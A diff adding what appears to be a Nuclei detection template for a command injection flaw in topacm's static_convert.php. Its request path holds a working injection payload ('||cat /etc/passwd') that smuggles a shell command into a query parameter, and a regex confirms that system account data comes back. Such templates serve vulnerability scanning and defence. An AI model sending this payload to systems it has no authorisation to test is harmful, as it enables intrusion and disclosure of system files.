@@ -1,0 +1,24 @@
+id: command-injection-topacm
+
+info:
+  name: Command Injection in topacm static_convert.php
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects command injection vulnerability in topacm's static_convert.php allowing unauthorized access to the /etc/passwd file.
+  reference:
+    - https://planet.vulbox.com/detail/MTA4NDg=
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[^:]*:[0-9]*:[0-9]*:[^:]*"
+        part: body
